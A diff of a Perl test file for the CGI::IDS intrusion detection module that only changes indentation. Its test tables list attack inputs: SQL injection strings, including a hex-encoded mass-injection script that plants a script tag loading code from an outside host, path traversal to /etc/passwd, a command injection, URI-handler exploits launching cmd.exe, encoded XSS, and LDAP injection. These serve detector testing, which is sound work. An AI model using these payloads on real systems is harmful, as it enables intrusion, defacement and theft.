-	7 => "'DECLARE%20\@S%20CHAR(4000);SET%20\@S=CAST(0x4445434C415245204054207661726368617228323535292C40432076617263686172283430303029204445434C415245205461626C655F437572736F7220435552534F5220464F522073656C65637420612E6E616D652C622E6E616D652066726F6D207379736F626A6563747320612C737973636F6C756D6E73206220776865726520612E69643D622E696420616E6420612E78747970653D27752720616E642028622E78747970653D3939206F7220622E78747970653D3335206F7220622E78747970653D323331206F7220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20657865632827757064617465205B272B40542B275D20736574205B272B40432B275D3D2727223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777302E646F7568756E716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D27272B5B272B40432B275D20776865726520272B40432B27206E6F74206C696B6520272725223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777302E646F7568756E716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D272727294645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20AS%20CHAR(4000));EXEC(\@S);';",
-	8 => "asaa';SELECT[asd]FROM[asd]",
-	9 => "asd'; select [column] from users ",
-	10 => "0x31 union select @"."@"."version,username,password from users ",
-	11 => "1 order by if(1<2 ,uname,uid) ",
-	12 => "1 order by ifnull(null,userid) ",
-	13 => "2' between 1 and 3 or 0x61 like 'a",
-	14 => "4' MOD 2 like '0",
-	15 => "-1' /ID having 1< 1 and 1 like 1/'1 ",
-	16 => "2' / 0x62 or 0 like binary '0",
-	17 => "0' between 2-1 and 4-1 or 1 sounds like binary '1 ",
-	18 => "-1' union ((select (select user),(select password),1/1 from mysql.user)) order by '1 ",
-	19 => "-1' or substring(null/null,1/null,1) or '1",
-	20 => "1' and 1 = hex(null-1 or 1) or 1 /'null ",
-	21 => "AND CONNECTION_ID()=CONNECTION_ID()",
-	22 => "AND ISNULL(1/0)",
-	23 => "MID(\@\@hostname, 1, 1)",
-	24 => "CHARSET(CURRENT_USER())",
-	25 => "DATABASE() LIKE SCHEMA()",
-	26 => "COERCIBILITY(USER())",
-	27 => "1' and 0x1abc like 0x88 or '0",
-	28 => "'-1-0 union select (select `table_name` from `information_schema`.tables limit 1) and '1",
-	29 => "null''null' find_in_set(uname, 'lightos' ) and '1",
-	30 => "(case-1 when mid(load_file(0x61616161),12, 1/ 1)like 0x61 then 1 else 0 end) ",
-	31 => CGI::IDS::urldecode('%27sounds%20like%281%29%20union%19%28select%191,group_concat%28table_name%29,3%19from%19information_schema.%60tables%60%29%23%28'),
-	32 => "0' '1' like (0) and 1 sounds like a or true#1",
+    4 => "\@query  = null+null+null+ ' UPDATE '+null+\@a+ ' SET[  '+null+\@b+ ' ]  = \@payload'",
+    5 => "asd' union distinct(select null,password,null from users)--a ",
+    6 => "asd' union distinct ( select null,password,(null)from user )-- a ",
+    7 => "'DECLARE%20\@S%20CHAR(4000);SET%20\@S=CAST(0x4445434C415245204054207661726368617228323535292C40432076617263686172283430303029204445434C415245205461626C655F437572736F7220435552534F5220464F522073656C65637420612E6E616D652C622E6E616D652066726F6D207379736F626A6563747320612C737973636F6C756D6E73206220776865726520612E69643D622E696420616E6420612E78747970653D27752720616E642028622E78747970653D3939206F7220622E78747970653D3335206F7220622E78747970653D323331206F7220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20657865632827757064617465205B272B40542B275D20736574205B272B40432B275D3D2727223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777302E646F7568756E716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D27272B5B272B40432B275D20776865726520272B40432B27206E6F74206C696B6520272725223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777302E646F7568756E716E2E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D272727294645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20AS%20CHAR(4000));EXEC(\@S);';",
+    8 => "asaa';SELECT[asd]FROM[asd]",
+    9 => "asd'; select [column] from users ",
+    10 => "0x31 union select @"."@"."version,username,password from users ",
+    11 => "1 order by if(1<2 ,uname,uid) ",
+    12 => "1 order by ifnull(null,userid) ",
+    13 => "2' between 1 and 3 or 0x61 like 'a",
+    14 => "4' MOD 2 like '0",
+    15 => "-1' /ID having 1< 1 and 1 like 1/'1 ",
+    16 => "2' / 0x62 or 0 like binary '0",
+    17 => "0' between 2-1 and 4-1 or 1 sounds like binary '1 ",
+    18 => "-1' union ((select (select user),(select password),1/1 from mysql.user)) order by '1 ",
+    19 => "-1' or substring(null/null,1/null,1) or '1",
+    20 => "1' and 1 = hex(null-1 or 1) or 1 /'null ",
+    21 => "AND CONNECTION_ID()=CONNECTION_ID()",
+    22 => "AND ISNULL(1/0)",
+    23 => "MID(\@\@hostname, 1, 1)",
+    24 => "CHARSET(CURRENT_USER())",
+    25 => "DATABASE() LIKE SCHEMA()",
+    26 => "COERCIBILITY(USER())",
+    27 => "1' and 0x1abc like 0x88 or '0",
+    28 => "'-1-0 union select (select `table_name` from `information_schema`.tables limit 1) and '1",
+    29 => "null''null' find_in_set(uname, 'lightos' ) and '1",
+    30 => "(case-1 when mid(load_file(0x61616161),12, 1/ 1)like 0x61 then 1 else 0 end) ",
+    31 => CGI::IDS::urldecode('%27sounds%20like%281%29%20union%19%28select%191,group_concat%28table_name%29,3%19from%19information_schema.%60tables%60%29%23%28'),
+    32 => "0' '1' like (0) and 1 sounds like a or true#1",
 );
 
 my %testDTList = (
-	0   => '../../etc/passwd',
-	1   => '\\\%windir%\\\cmd.exe',
-	2   => '1;cat /e*c/p*d',
-	3   => '%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00',
-	4   => '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
-	5   => '/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini',
-	6   => 'C:\\boot.ini',
-	7   => '../../../../../../../../../../../../localstart.asp%00',
-	8   => '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini',
-	9   => '&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;',
-	10  => '../../../../../../../../conf/server.xml',
-	11  => '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
-	12  => 'dir/..././..././folder/file.php ',
+    0   => '../../etc/passwd',
+    1   => '\\\%windir%\\\cmd.exe',
+    2   => '1;cat /e*c/p*d',
+    3   => '%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00',
+    4   => '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
+    5   => '/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini',
+    6   => 'C:\\boot.ini',
+    7   => '../../../../../../../../../../../../localstart.asp%00',
+    8   => '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini',
+    9   => '&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;',
+    10  => '../../../../../../../../conf/server.xml',
+    11  => '/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
+    12  => 'dir/..././..././folder/file.php ',
 );
 
 my %testURIList = (
-	0   => 'firefoxurl:test|"%20-new-window%20file:\c:/test.txt',
-	1   => 'firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"',
-	2   => 'aim: &c:\windows\system32\calc.exe" ini="C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat"',
-	3   => 'navigatorurl:test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)',
-	4   => 'res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210',
-	5   => 'mailto:%00%00../../../../../../windows/system32/cmd".exe ../../../../../../../../windows/system32/calc.exe " - " blah.bat',
+    0   => 'firefoxurl:test|"%20-new-window%20file:\c:/test.txt',
+    1   => 'firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"',
+    2   => 'aim: &c:\windows\system32\calc.exe" ini="C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat"',
+    3   => 'navigatorurl:test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)',
+    4   => 'res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210',
+    5   => 'mailto:%00%00../../../../../../windows/system32/cmd".exe ../../../../../../../../windows/system32/calc.exe " - " blah.bat',
 );
 
 my %testRFEList = (
@@ -848,50 +848,50 @@ my %testRFEList = (
 );
 
 my %testUTF7List = (
-	0   => '+alert(1)',
-	1   => 'ACM=1,1+eval(1+name+(+ACM-1),ACM)',
-	2   => '1+eval(1+name+(+1-1),-1)',
-	3   => 'XSS without being noticed<a/href=da&#x74&#97:text/html&#59&#x63harset=UTF-7&#44+ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAxACkAPAAvAHMAYwByAGkAcAB0AD4->test',
+    0   => '+alert(1)',
+    1   => 'ACM=1,1+eval(1+name+(+ACM-1),ACM)',
+    2   => '1+eval(1+name+(+1-1),-1)',
+    3   => 'XSS without being noticed<a/href=da&#x74&#97:text/html&#59&#x63harset=UTF-7&#44+ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAxACkAPAAvAHMAYwByAGkAcAB0AD4->test',
 );
 
 my %testBase64CCConverter = (
-	0   => 'PHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4==',
-	1   => '<a href=dat&#x61&#x3atext&#x2fhtml&#x3b&#59base64a&#x2cPHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4>Test</a>',
-	2   => '<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4>',
-	3   => '<applet src="data:text/html;base64,PHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4" type=text/html>',
+    0   => 'PHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4==',
+    1   => '<a href=dat&#x61&#x3atext&#x2fhtml&#x3b&#59base64a&#x2cPHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4>Test</a>',
+    2   => '<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4>',
+    3   => '<applet src="data:text/html;base64,PHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4" type=text/html>',
 );
 
 my %testDecimalCCConverter = (
-	0   => '&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#32;&#108;&#97;&#110;&#103;&#117;&#97;&#103;&#101;&#61;&#34;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#62;&#32;&#10;&#47;&#47;&#32;&#67;&#114;&#101;&#97;&#109;&#111;&#115;&#32;&#108;&#97;&#32;&#99;&#108;&#97;&#115;&#101;&#32;&#10;&#102;&#117;&#110;&#99;&#116;&#105;&#111;&#110;&#32;&#112;&#111;&#112;&#117;&#112;&#32;&#40;&#32;&#41;&#32;&#123;&#32;&#10;&#32;&#47;&#47;&#32;&#65;&#116;&#114;&#105;&#98;&#117;&#116;&#111;&#32;&#112;&#250;&#98;&#108;&#105;&#99;&#111;&#32;&#105;&#110;&#105;&#99;&#105;&#97;&#108;&#105;&#122;&#97;&#100;&#111;&#32;&#97;&#32;&#97;&#98;&#111;&#117;&#116;&#58;&#98;&#108;&#97;&#110;&#107;&#32;&#10;&#32;&#116;&#104;&#105;&#115;&#46;&#117;&#114;&#108;&#32;&#61;&#32;&#39;&#97;&#98;&#111;&#117;&#116;&#58;&#98;&#108;&#97;&#110;&#107;&#39;&#59;&#32;&#10;&#32;&#47;&#47;&#32;&#65;&#116;&#114;&#105;&#98;&#117;&#116;&#111;&#32;&#112;&#114;&#105;&#118;&#97;&#100;&#111;&#32;&#112;&#97;&#114;&#97;&#32;&#101;&#108;&#32;&#111;&#98;&#106;&#101;&#116;&#111;&#32;&#119;&#105;&#110;&#100;&#111;&#119;&#32;&#10;&#32;&#118;&#97;&#114;&#32;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#32;&#61;&#32;&#110;&#117;&#108;&#108;&#59;&#32;&#10;&#32;&#47;&#47;&#32;&#46;&#46;&#46;&#32;&#10;&#125;&#32;&#10;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#32;&#61;&#32;&#110;&#101;&#119;&#32;&#112;&#111;&#112;&#117;&#112;&#32;&#40;&#41;&#59;&#32;&#10;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#46;&#117;&#114;&#108;&#32;&#61;&#32;&#39;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#119;&#119;&#119;&#46;&#112;&#114;&#111;&#103;&#114;&#97;&#109;&#97;&#99;&#105;&#111;&#110;&#119;&#101;&#98;&#46;&#110;&#101;&#116;&#47;&#39;&#59;&#32;&#10;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#32;&#10;&#32;',
-	1   => MIME::Base64::decode_base64('NjAsMTE1LDk5LDExNCwxMDUsMTEyLDExNiw2Miw5NywxMDgsMTAwKzEsMTE0LDExNiw0MCw0OSw0MSw2MCw0NywxMTUsOTksMTE0LDEwNSwxMTIsMTE2LDYy'),
+    0   => '&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#32;&#108;&#97;&#110;&#103;&#117;&#97;&#103;&#101;&#61;&#34;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#62;&#32;&#10;&#47;&#47;&#32;&#67;&#114;&#101;&#97;&#109;&#111;&#115;&#32;&#108;&#97;&#32;&#99;&#108;&#97;&#115;&#101;&#32;&#10;&#102;&#117;&#110;&#99;&#116;&#105;&#111;&#110;&#32;&#112;&#111;&#112;&#117;&#112;&#32;&#40;&#32;&#41;&#32;&#123;&#32;&#10;&#32;&#47;&#47;&#32;&#65;&#116;&#114;&#105;&#98;&#117;&#116;&#111;&#32;&#112;&#250;&#98;&#108;&#105;&#99;&#111;&#32;&#105;&#110;&#105;&#99;&#105;&#97;&#108;&#105;&#122;&#97;&#100;&#111;&#32;&#97;&#32;&#97;&#98;&#111;&#117;&#116;&#58;&#98;&#108;&#97;&#110;&#107;&#32;&#10;&#32;&#116;&#104;&#105;&#115;&#46;&#117;&#114;&#108;&#32;&#61;&#32;&#39;&#97;&#98;&#111;&#117;&#116;&#58;&#98;&#108;&#97;&#110;&#107;&#39;&#59;&#32;&#10;&#32;&#47;&#47;&#32;&#65;&#116;&#114;&#105;&#98;&#117;&#116;&#111;&#32;&#112;&#114;&#105;&#118;&#97;&#100;&#111;&#32;&#112;&#97;&#114;&#97;&#32;&#101;&#108;&#32;&#111;&#98;&#106;&#101;&#116;&#111;&#32;&#119;&#105;&#110;&#100;&#111;&#119;&#32;&#10;&#32;&#118;&#97;&#114;&#32;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#32;&#61;&#32;&#110;&#117;&#108;&#108;&#59;&#32;&#10;&#32;&#47;&#47;&#32;&#46;&#46;&#46;&#32;&#10;&#125;&#32;&#10;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#32;&#61;&#32;&#110;&#101;&#119;&#32;&#112;&#111;&#112;&#117;&#112;&#32;&#40;&#41;&#59;&#32;&#10;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#46;&#117;&#114;&#108;&#32;&#61;&#32;&#39;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#119;&#119;&#119;&#46;&#112;&#114;&#111;&#103;&#114;&#97;&#109;&#97;&#99;&#105;&#111;&#110;&#119;&#101;&#98;&#46;&#110;&#101;&#116;&#47;&#39;&#59;&#32;&#10;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#32;&#10;&#32;',
+    1   => MIME::Base64::decode_base64('NjAsMTE1LDk5LDExNCwxMDUsMTEyLDExNiw2Miw5NywxMDgsMTAwKzEsMTE0LDExNiw0MCw0OSw0MSw2MCw0NywxMTUsOTksMTE0LDEwNSwxMTIsMTE2LDYy'),
 );
 
 my %testOctalCCConverter = (
-	0   => '\\\47\\\150\\\151\\\47\\\51\\\74\\\57\\\163\\\143\\\162\\\151\\\160\\\164\\\76',
-	1   => '\\\74\\\163\\\143\\\162\\\151\\\160\\\164\\\76\\\141\\\154\\\145\\\162\\\164\\\50\\\47\\\150\\\151\\\47\\\51\\\74\\\57\\\163\\\143\\\162\\\151\\\160\\\164\\\76',
+    0   => '\\\47\\\150\\\151\\\47\\\51\\\74\\\57\\\163\\\143\\\162\\\151\\\160\\\164\\\76',
+    1   => '\\\74\\\163\\\143\\\162\\\151\\\160\\\164\\\76\\\141\\\154\\\145\\\162\\\164\\\50\\\47\\\150\\\151\\\47\\\51\\\74\\\57\\\163\\\143\\\162\\\151\\\160\\\164\\\76',
 );
 
 my %testHexCCConverter = (
-	0	=>	'&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3a&#x61&#x6c&#x65&#x72&#x74&#x28&#x31&#x29',
-	1	=>	';&#x6e;&#x67;&#x75;&#x61;&#x67;&#x65;&#x3d;&#x22;&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x22;&#x3e;&#x20;&#x0a;&#x2f;&#x2f;&#x20;&#x43;&#x72;&#x65;&#x61;&#x6d;&#x6f;&#x73;&#x20;&#x6c;&#x61;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x65;&#x20;&#x0a;&#x66;&#x75;&#x6e;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x70;&#x6f;&#x70;&#x75;&#x70;&#x20;&#x28;&#x20;&#x29;&#x20;&#x7b;&#x20;&#x0a;&#x20;&#x2f;&#x2f;&#x20;&#x41;&#x74;&#x72;&#x69;&#x62;&#x75;&#x74;&#x6f;&#x20;&#x70;&#xfa;&#x62;&#x6c;&#x69;&#x63;&#x6f;&#x20;&#x69;&#x6e;&#x69;&#x63;&#x69;&#x61;&#x6c;&#x69;&#x7a;&#x61;&#x64;&#x6f;&#x20;&#x61;&#x20;&#x61;&#x62;&#x6f;&#x75;&#x74;&#x3a;&#x62;&#x6c;&#x61;&#x6e;&#x6b;&#x20;&#x0a;&#x20;&#x74;&#x68;&#x69;&#x73;&#x2e;&#x75;&#x72;&#x6c;&#x20;&#x3d;&#x20;&#x27;&#x61;&#x62;&#x6f;&#x75;&#x74;&#x3a;&#x62;&#x6c;&#x61;&#x6e;&#x6b;&#x27;&#x3b;&#x20;&#x0a;&#x20;&#x2f;&#x2f;&#x20;&#x41;&#x74;&#x72;&#x69;&#x62;&#x75;&#x74;&#x6f;&#x20;&#x70;&#x72;&#x69;&#x76;&#x61;&#x64;&#x6f;&#x20;&#x70;&#x61;&#x72;&#x61;&#x20;&#x65;&#x6c;&#x20;&#x6f;&#x62;&#x6a;&#x65;&#x74;&#x6f;&#x20;&#x77;&#x69;&#x6e;&#x64;&#x6f;&#x77;&#x20;&#x0a;&#x20;&#x76;&#x61;&#x72;&#x20;&#x76;&#x65;&#x6e;&#x74;&#x61;&#x6e;&#x61;&#x20;&#x3d;&#x20;&#x6e;&#x75;&#x6c;&#x6c;&#x3b;&#x20;&#x0a;&#x20;&#x2f;&#x2f;&#x20;&#x2e;&#x2e;&#x2e;&#x20;&#x0a;&#x7d;&#x20;&#x0a;&#x76;&#x65;&#x6e;&#x74;&#x61;&#x6e;&#x61;&#x20;&#x3d;&#x20;&#x6e;&#x65;&#x77;&#x20;&#x70;&#x6f;&#x70;&#x75;&#x70;&#x20;&#x28;&#x29;&#x3b;&#x20;&#x0a;&#x76;&#x65;&#x6e;&#x74;&#x61;&#x6e;&#x61;&#x2e;&#x75;&#x72;&#x6c;&#x20;&#x3d;&#x20;&#x27;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x77;&#x77;&#x77;&#x2e;&#x70;&#x72;&#x6f;&#x67;&#x72;&#x61;&#x6d;&#x61;&#x63;&#x69;&#x6f;&#x6e;&#x77;&#x65;&#x62;&#x2e;&#x6e;&#x65;&#x74;&#x2f;&#x27;&#x3b;&#x20;&#x0a;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x20;&#x0a;&#x20;',
-	2	=>	'\\\x0000003c\\\x0000073\\\x0000063\\\x0000072\\\x0000069\\\x0000070\\\x0000074\\\x000003e\\\x0000061\\\x000006c\\\x0000065\\\x0000072\\\x0000074\\\x0000028\\\x0000032\\\x0000029\\\x000003c\\\x000002f\\\x0000073\\\x0000063\\\x0000072\\\x0000069\\\x0000070\\\x0000074\\\x000003e',
-	3	=>	'x=&#x65&#x76&#x61&#x6c,y=&#x61&#x6c&#x65&#x72&#x74&#x28&#x31&#x29
-	            x(y)',
-	4	=>	'j&#97vascrip&#x74&#58ale&#x72&#x74&#x28&#x2F&#x58&#x53&#x53&#x20&#x50&#x55&#x4E&#x43&#x48&#x21&#x2F&#x29',
+    0   =>  '&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3a&#x61&#x6c&#x65&#x72&#x74&#x28&#x31&#x29',
+    1   =>  ';&#x6e;&#x67;&#x75;&#x61;&#x67;&#x65;&#x3d;&#x22;&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x22;&#x3e;&#x20;&#x0a;&#x2f;&#x2f;&#x20;&#x43;&#x72;&#x65;&#x61;&#x6d;&#x6f;&#x73;&#x20;&#x6c;&#x61;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x65;&#x20;&#x0a;&#x66;&#x75;&#x6e;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x70;&#x6f;&#x70;&#x75;&#x70;&#x20;&#x28;&#x20;&#x29;&#x20;&#x7b;&#x20;&#x0a;&#x20;&#x2f;&#x2f;&#x20;&#x41;&#x74;&#x72;&#x69;&#x62;&#x75;&#x74;&#x6f;&#x20;&#x70;&#xfa;&#x62;&#x6c;&#x69;&#x63;&#x6f;&#x20;&#x69;&#x6e;&#x69;&#x63;&#x69;&#x61;&#x6c;&#x69;&#x7a;&#x61;&#x64;&#x6f;&#x20;&#x61;&#x20;&#x61;&#x62;&#x6f;&#x75;&#x74;&#x3a;&#x62;&#x6c;&#x61;&#x6e;&#x6b;&#x20;&#x0a;&#x20;&#x74;&#x68;&#x69;&#x73;&#x2e;&#x75;&#x72;&#x6c;&#x20;&#x3d;&#x20;&#x27;&#x61;&#x62;&#x6f;&#x75;&#x74;&#x3a;&#x62;&#x6c;&#x61;&#x6e;&#x6b;&#x27;&#x3b;&#x20;&#x0a;&#x20;&#x2f;&#x2f;&#x20;&#x41;&#x74;&#x72;&#x69;&#x62;&#x75;&#x74;&#x6f;&#x20;&#x70;&#x72;&#x69;&#x76;&#x61;&#x64;&#x6f;&#x20;&#x70;&#x61;&#x72;&#x61;&#x20;&#x65;&#x6c;&#x20;&#x6f;&#x62;&#x6a;&#x65;&#x74;&#x6f;&#x20;&#x77;&#x69;&#x6e;&#x64;&#x6f;&#x77;&#x20;&#x0a;&#x20;&#x76;&#x61;&#x72;&#x20;&#x76;&#x65;&#x6e;&#x74;&#x61;&#x6e;&#x61;&#x20;&#x3d;&#x20;&#x6e;&#x75;&#x6c;&#x6c;&#x3b;&#x20;&#x0a;&#x20;&#x2f;&#x2f;&#x20;&#x2e;&#x2e;&#x2e;&#x20;&#x0a;&#x7d;&#x20;&#x0a;&#x76;&#x65;&#x6e;&#x74;&#x61;&#x6e;&#x61;&#x20;&#x3d;&#x20;&#x6e;&#x65;&#x77;&#x20;&#x70;&#x6f;&#x70;&#x75;&#x70;&#x20;&#x28;&#x29;&#x3b;&#x20;&#x0a;&#x76;&#x65;&#x6e;&#x74;&#x61;&#x6e;&#x61;&#x2e;&#x75;&#x72;&#x6c;&#x20;&#x3d;&#x20;&#x27;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x77;&#x77;&#x77;&#x2e;&#x70;&#x72;&#x6f;&#x67;&#x72;&#x61;&#x6d;&#x61;&#x63;&#x69;&#x6f;&#x6e;&#x77;&#x65;&#x62;&#x2e;&#x6e;&#x65;&#x74;&#x2f;&#x27;&#x3b;&#x20;&#x0a;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x20;&#x0a;&#x20;',
+    2   =>  '\\\x0000003c\\\x0000073\\\x0000063\\\x0000072\\\x0000069\\\x0000070\\\x0000074\\\x000003e\\\x0000061\\\x000006c\\\x0000065\\\x0000072\\\x0000074\\\x0000028\\\x0000032\\\x0000029\\\x000003c\\\x000002f\\\x0000073\\\x0000063\\\x0000072\\\x0000069\\\x0000070\\\x0000074\\\x000003e',
+    3   =>  'x=&#x65&#x76&#x61&#x6c,y=&#x61&#x6c&#x65&#x72&#x74&#x28&#x31&#x29
+                x(y)',
+    4   =>  'j&#97vascrip&#x74&#58ale&#x72&#x74&#x28&#x2F&#x58&#x53&#x53&#x20&#x50&#x55&#x4E&#x43&#x48&#x21&#x2F&#x29',
 );
 
 my %testLDAPInjectionList = (
-	0   => "*(|(objectclass=*))",
-	1   => "*)(uid=*))(|(uid=*",
-	2   => "*))));",
+    0   => "*(|(objectclass=*))",
+    1   => "*)(uid=*))(|(uid=*",
+    2   => "*))));",
 );
 
 my %testJSONScanning = (
-	json_value => '{"a":"b","c":["><script>alert(1);</script>", 111, "eval(name)"]}',
+    json_value => '{"a":"b","c":["><script>alert(1);</script>", 111, "eval(name)"]}',
 );
 
 my %testForFalseAlerts = (
-	0 => 'war bereits als Gastgeber automatisch für das Turnier qualifiziert. Die restlichen 15 Endrundenplätze wurden zwischen Juni
+    0 => 'war bereits als Gastgeber automatisch für das Turnier qualifiziert. Die restlichen 15 Endrundenplätze wurden zwischen Juni
                     2005 und Mai 2007 ermittelt. Hierbei waren mit Ausnahme der UEFA-Zone die jeweiligen Kontinentalmeisterschaften gleichzeitig
                     das Qualifikationsturnier für die Weltmeisterschaft. Die UEFA stellt bei der Endrunde fünf Mannschaften. Die Teilnehmer wurden in
                     einer Qualifikationsphase ermittelt, die am 9. Juli 2005 startete und am 30. September 2006 endete. Hierbei wurden die 25 Mannschaften der Kategorie A in fünf
@@ -956,58 +956,58 @@ my %testForFalseAlerts = (
 # croak tests
 print testmessage("croak tests");
 eval {
-	my $ids = new CGI::IDS(
-		filters_file	=> "$Bin/data/missing_filter_file.xml",
-	);
+    my $ids = new CGI::IDS(
+        filters_file    => "$Bin/data/missing_filter_file.xml",
+    );
 };
 like( $@, qr/(?:Error in _load_filters_from_xml while parsing).*(?:File does not exist)/, 'Croak if filter file is missing');
 
 eval {
-	my $ids = new CGI::IDS(
-		filters_file	=> "$Bin/data/test_filter_bad_xml.xml",
-	);
+    my $ids = new CGI::IDS(
+        filters_file    => "$Bin/data/test_filter_bad_xml.xml",
+    );
 };
 like( $@, qr/(?:Error in _load_filters_from_xml while parsing)(?!.*(?:File does not exist))/, 'Croak if filter file has incorrect XML');
 
 eval {
-	my $ids = new CGI::IDS(
-		filters_file	=> "$Bin/data/test_filter_bad_regex.xml",
-	);
+    my $ids = new CGI::IDS(
+        filters_file    => "$Bin/data/test_filter_bad_regex.xml",
+    );
 };
 like( $@, qr/Error in filter rule/, 'Croak if filter file contains incorrect RegEx' );
 
 eval {
-	my $ids = new CGI::IDS(
-		filters_file	=> "$Bin/data/test_filter_bad_data.xml",
-	);
+    my $ids = new CGI::IDS(
+        filters_file    => "$Bin/data/test_filter_bad_data.xml",
+    );
 };
